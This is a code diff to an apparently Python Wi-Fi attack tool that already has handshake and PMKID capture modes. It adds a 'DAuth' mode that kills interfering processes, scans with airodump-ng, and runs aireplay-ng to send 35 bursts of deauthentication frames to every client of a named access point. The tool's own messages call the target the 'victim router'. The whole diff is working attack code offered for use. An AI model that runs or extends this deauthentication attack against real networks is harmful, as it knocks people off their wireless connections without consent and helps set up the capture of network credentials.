@@ -51,6 +51,7 @@ def menu_panel():
     get_colours("(-a)  Attack mode", "yellow")
     get_colours(f"\t Handshake", "cyan")
     get_colours(f"\t PKMID", "cyan")
+    get_colours(f"\t DAuth", "cyan")
     get_colours("(-h) Help Panel", "yellow")
     print(Fore.WHITE)  # To avoid leaving the terminal with colors.
 
@@ -218,6 +219,43 @@ def attack_func(network_interface, attack_mode):
             os.system("rm -rf Cap*")
             os.system('clear')
             quit_program()
+    elif attack_mode == "DAuth":
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
+        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
+        # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
+        access_name = input(Fore.YELLOW + "Access point name: ")
+        access_channel = input(Fore.YELLOW + "Channel name: ")
+        time.sleep(1)
+        get_colours("\n[*] Setting up things...", 'cyan')
+        try:
+            process.wait(timeout=2)  # Time for the process
+        except subprocess.TimeoutExpired:
+            process.kill()
+        os.system(
+            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface}mon &")
+        os.system(f"xterm -hold -e aireplay-ng -0 35 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
+        subprocess.run(["clear"])
+        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
+        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
+        out, err = process1.communicate()
+        timer_total = 70
+        timer_process = range(timer_total, 9, -1)
+        for i in timer_process:
+            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
+            sys.stdout.write("\033[F")  # Cursor up one line
+            time.sleep(1)
+        os.system('clear')
+        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
+        timer_process = range(9, 0, -1)
+        for i in timer_process:
+            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
+            sys.stdout.write("\033[F")  # Cursor up one line
+            time.sleep(1)
+        # time.sleep(65)
+        for line in out.splitlines():
+            if b'xterm' in line:
+                pid = int(line.split(None, 1)[0])
+                os.kill(pid, signal.SIGKILL)
 
 
 def quit_program():
@@ -239,7 +277,7 @@ def check_parms():
             if len(sys.argv) > 3:
                 if len(sys.argv) > 4:
                     check_interface_exist = subprocess.run(["ip", "a"], capture_output=True, text=True)
-                    check_attack_mode = ["Handshake", "PKMID"]
+                    check_attack_mode = ["Handshake", "PKMID", "DAuth"]
                     if sys.argv[2] not in check_interface_exist.stdout:
                         get_colours("\nInvalid Network Interface name (Ej: wlan0 / eth0)", "red")
                         print(Fore.WHITE)
